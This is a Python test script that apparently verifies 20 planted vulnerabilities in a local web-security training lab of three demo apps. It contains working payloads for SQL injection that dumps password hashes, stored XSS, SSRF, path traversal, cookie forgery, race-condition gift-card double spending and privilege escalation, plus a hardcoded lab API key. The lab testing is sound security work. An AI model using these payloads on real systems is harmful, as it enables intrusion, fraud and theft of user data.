#!/usr/bin/env python3
"""End-to-end check for the demo-web lab.

    python3 verify_all.py

Runs every finding against the seeded databases and prints PASS/FAIL. It mutates state
(orders, credit, gift cards, users' roles), so run it against a fresh copy:

    rm -f */instance/*.db && python3 serve.py
    python3 verify_all.py

The two stored-XSS findings are checked by inspecting the served HTML here; execution was
verified separately in a real browser (Playwright).
"""

import base64
import hashlib
import re
import sqlite3
import sys
import threading
from pathlib import Path

import requests

BASE = Path(__file__).resolve().parent
QW, HL, MER = "http://127.0.0.1:8801", "http://127.0.0.1:8802", "http://127.0.0.1:8803"
HL_KEY = "hl_live_7c41d9e2b8a640f5c3d1e0a9b7f2c4d8"
results = []


def check(name, ok, detail=""):
    results.append((name, bool(ok), detail))
    print("%-4s %-58s %s" % ("PASS" if ok else "FAIL", name, detail))


def db(path):
    conn = sqlite3.connect(str(BASE / path))
    conn.row_factory = sqlite3.Row
    return conn


def value(path, sql, args=()):
    conn = db(path)
    try:
        row = conn.execute(sql, args).fetchone()
        return row[0] if row else None
    finally:
        conn.close()


def login(base, email, password):
    s = requests.Session()
    s.post(base + "/login", data={"email": email, "password": password})
    return s


# ------------------------------------------------------------------ Quillworks

def quillworks():
    qw_db = "quillworks/instance/quillworks.db"
    s = login(QW, "demo@quillworks.test", "demo1234")

    payload = "zz') UNION SELECT 1,email||':'||password_hash,'sandbox' FROM users--"
    r = s.post(QW + "/w/sandbox/new", data={
        "title": "Related reading", "body": "Nothing to see here.", "tags": payload})
    note_id = re.search(r"/w/sandbox/n/(\d+)", r.url).group(1)
    page = s.get(QW + "/w/sandbox/n/" + note_id).text
    check("Quillworks 1 — second-order SQLi in tags", "scrypt:" in page,
          "hashes rendered in related notes")

    r = s.post("%s/api/notes/%s/versions/9/restore" % (QW, note_id))
    page = s.get(QW + "/w/sandbox/n/" + note_id).text
    check("Quillworks 2 — cross-workspace revision restore",
          r.status_code == 200 and "Margin target" in page,
          "private memo restored into own note")

    r = s.patch(QW + "/api/workspaces/1/members/2", json={"role": "owner"})
    page = s.get(QW + "/w/atlas/settings").text
    check("Quillworks 3 — self role escalation", r.status_code == 200 and "Danger zone" in page,
          "editor became owner")

    s.post(QW + "/w/sandbox/n/%s/comment" % note_id, data={
        "body": '![a](x" onerror="alert&#40;document.domain&#41;")'})
    page = s.get(QW + "/w/sandbox/n/" + note_id).text
    check("Quillworks 4 — stored XSS in comments",
          'onerror="alert&#40;document.domain&#41;' in page, "payload preserved in img tag")

    r = s.post(QW + "/w/sandbox/import", data={"url": HL + "/api/v1/products"})
    check("Quillworks 5 — SSRF in document import", "HL-TNT-2P" in r.text,
          "fetched internal store API")

    r = requests.post(QW + "/login", data={
        "email": "demo@quillworks.test", "password": "demo1234",
        "next": "//evil.example/x"}, allow_redirects=False)
    check("Quillworks 6 — open redirect", r.headers.get("Location") == "//evil.example/x",
          r.headers.get("Location", ""))


# ------------------------------------------------------------------ Harbor Lane

def harborlane():
    s = login(HL, "demo@harborlane.test", "demo1234")
    credit_before = value("harborlane/instance/harborlane.db",
                          "SELECT credit_cents FROM users WHERE email='demo@harborlane.test'")

    s.post(HL + "/api/v1/cart/items", json={"sku": "HL-TNT-2P", "qty": -2})
    r = s.post(HL + "/checkout", data={
        "email": "demo@harborlane.test", "ship_name": "Alex Rivera",
        "address": "1 Test Lane"}, allow_redirects=False)
    ref = re.search(r"/order/(HL-[\d-]+)", r.headers.get("Location", "")).group(1)
    page = s.get(HL + "/order/" + ref).text
    credit_after = value("harborlane/instance/harborlane.db",
                         "SELECT credit_cents FROM users WHERE email='demo@harborlane.test'")
    check("Harbor Lane 7 — negative quantity checkout",
          "$-658.00" in page and credit_after - credit_before == 65800,
          "negative total, +$658 credit")

    s2 = login(HL, "demo@harborlane.test", "demo1234")
    s2.post(HL + "/api/v1/cart/items", json={"sku": "HL-BAG-15", "qty": 2})
    before = value("harborlane/instance/harborlane.db",
                   "SELECT balance_cents FROM gift_cards WHERE code='HL-GIFT-200'")
    cookies = s2.cookies.get_dict()

    def chk():
        ss = requests.Session()
        ss.cookies.update(cookies)
        ss.post(HL + "/checkout", data={
            "email": "demo@harborlane.test", "ship_name": "Alex",
            "address": "1 Test Lane", "gift_card": "HL-GIFT-200"})

    threads = [threading.Thread(target=chk) for _ in range(2)]
    [t.start() for t in threads]
    [t.join() for t in threads]
    after = value("harborlane/instance/harborlane.db",
                  "SELECT balance_cents FROM gift_cards WHERE code='HL-GIFT-200'")
    check("Harbor Lane 8 — gift-card double spend", after == before - 40000,
          "balance %d -> %d" % (before, after))

    c0 = value("harborlane/instance/harborlane.db",
               "SELECT credit_cents FROM users WHERE email='demo@harborlane.test'")
    r = s.post(HL + "/api/v1/returns", json={"order_item_id": 1, "reason": "damaged"})
    c1 = value("harborlane/instance/harborlane.db",
               "SELECT credit_cents FROM users WHERE email='demo@harborlane.test'")
    check("Harbor Lane 9 — returns BOLA", r.status_code == 200 and c1 - c0 == 32900,
          "victim item refunded to attacker")

    r = requests.get(HL + "/order/HL-00001-048")
    check("Harbor Lane 10 — predictable order reference",
          r.status_code == 200 and "mira@harborlane.test" in r.text, "order 1 enumerated")

    r = requests.get(HL + "/api/v1/customers/export?key=" + HL_KEY)
    check("Harbor Lane 11 — leaked API key exports customers",
          r.status_code == 200 and "mira@harborlane.test" in r.text,
          "%d rows" % (len(r.text.splitlines()) - 1))

    payload = '<iframe srcdoc="&lt;script&gt;alert(document.domain)&lt;/script&gt;">'
    s.post(HL + "/product/ridgeline-2p-tent/review",
           data={"rating": 5, "title": "Great", "body": payload})
    m = login(HL, "mira@harborlane.test", "mira1234")
    page = m.get(HL + "/merchant/reviews").text
    check("Harbor Lane 12 — stored XSS in merchant reviews",
          "&lt;script&gt;alert(document.domain)&lt;/script&gt;" in page, "iframe survives filter")

    r = requests.post(HL + "/api/v1/webhooks/test?key=" + HL_KEY,
                      json={"url": QW + "/login"})
    check("Harbor Lane 13 — SSRF in webhook tester",
          r.status_code == 200 and "Quillworks" in r.text, "internal page returned")

    svg = ('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">'
           '<rect width="10" height="10"/></svg>')
    r = m.post(HL + "/merchant/products",
               data={"name": "Proof SVG", "price": "1", "stock": "1", "category": "gear"},
               files={"image": ("proof.svg", svg, "image/svg+xml")})
    name = value("harborlane/instance/harborlane.db",
                 "SELECT image FROM products ORDER BY id DESC LIMIT 1")
    r = requests.get(HL + "/uploads/" + (name or "missing"))
    check("Harbor Lane 14 — SVG upload XSS",
          r.status_code == 200 and "image/svg+xml" in r.headers.get("Content-Type", ""),
          "served as " + r.headers.get("Content-Type", "?"))


# ------------------------------------------------------------------- Meridian

def meridian():
    s = login(MER, "demo@meridian.test", "demo1234")

    r = s.get(MER + "/admin/export/tickets.csv")
    check("Meridian 15 — CSV export missing role check",
          r.status_code == 200 and "MER-1004" in r.text and "Stripe refund" in r.text,
          "full ticket dump as customer")

    true_p = ("id.desc, CASE WHEN (SELECT substr(password_hash,1,1) FROM users WHERE id=1)='s' "
              "THEN abs(-9223372036854775808) ELSE 0 END")
    false_p = ("id.desc, CASE WHEN (SELECT substr(password_hash,1,1) FROM users WHERE id=1)='z' "
               "THEN abs(-9223372036854775808) ELSE 0 END")
    r1 = s.get(MER + "/api/tickets", params={"sort": true_p})
    r2 = s.get(MER + "/api/tickets", params={"sort": false_p})
    check("Meridian 16 — SQLi in sort (boolean oracle)",
          r1.status_code == 500 and r2.status_code == 200, "500 / 200")

    r = s.get(MER + "/api/tickets/1")
    check("Meridian 17 — internal notes in ticket API",
          r.status_code == 200 and any(m["is_internal"] for m in r.json()["messages"]),
          "internal note returned to customer")

    r = s.post(MER + "/tickets/new",
               data={"subject": "Proof", "body": "attached", "priority": "low"},
               allow_redirects=True)
    tid = re.search(r"/tickets/(\d+)", r.url).group(1)
    s.post(MER + "/tickets/%s/attachments" % tid,
           files={"file": ("proof.txt", b"hello", "text/plain")})
    aid = value("meridian/instance/meridian.db", "SELECT MAX(id) FROM attachments")
    r = s.get(MER + "/attachments/%s/..%%2Fapp.py" % aid)
    check("Meridian 18 — attachment path traversal",
          r.status_code == 200 and "meridian::" in r.text, "app.py source returned")

    token = base64.urlsafe_b64encode(
        ("1:" + hashlib.md5(b"1").hexdigest()).encode()).decode()
    forged = requests.Session()
    forged.cookies.set("meridian_remember", token)
    page = forged.get(MER + "/admin/").text
    check("Meridian 19 — forged remember-me cookie",
          "Overview" in page and "All tickets" in page, "admin session without password")

    ua = '<img src=x onerror="alert(document.domain)">'
    requests.post(MER + "/login", data={"email": "nobody@example.test", "password": "wrong"},
                  headers={"User-Agent": ua})
    admin = login(MER, "sofia@meridian.test", "sofia1234")
    page = admin.get(MER + "/admin/audit").text
    check("Meridian 20 — blind XSS via User-Agent",
          'onerror="alert(document.domain)"' in page, "raw UA in admin audit table")


def main():
    print("demo-web verification\n" + "-" * 78)
    try:
        quillworks()
        harborlane()
        meridian()
    except Exception as exc:  # noqa: BLE001
        print("\nERROR:", exc)
        print("Are all three apps running (python3 serve.py) with fresh databases?")

    passed = sum(1 for _, ok, _ in results if ok)
    print("-" * 78)
    print("%d/%d checks passed" % (passed, len(results)))
    return 0 if passed == len(results) else 1


if __name__ == "__main__":
    sys.exit(main())
